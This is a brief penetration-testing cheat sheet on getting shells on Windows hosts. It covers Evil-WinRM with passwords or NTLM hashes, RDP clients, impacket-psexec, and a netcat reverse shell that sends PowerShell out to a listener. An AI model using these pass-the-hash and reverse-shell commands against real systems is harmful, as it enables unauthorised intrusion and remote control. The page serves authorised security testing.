# 🐚 Shells

## Evil-WinRM

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

### Test with cme

```bash
cme winrm -i IP/hostname -u $USERNAME -p $PASSWORD/-H $LM_HASH
```

### Port : 5985

```bash
evil-winrm -i IP/hostname -u $USERNAME -H $HASH

evil-winrm -i IP/hostname -u $USERNAME -p $PASSWORD
```

## RDP

### freerdp

```bash
freerdp /u:$user /p:$password /v:$ip
```

### remmina

```bash
remmina -c rdp://$user@$ip
```

## `Impacket-psexec`

PSEXEC like functionality example using RemComSvc

```bash
impacket-psexec '$user:$password@$ip'
psexec.py $user:$pass@$ip
```

## `netcat`

```bash
# Windows
# server : 
nc.exe $ip $port -e powershell

# client : 
nc -lvnp $port
```
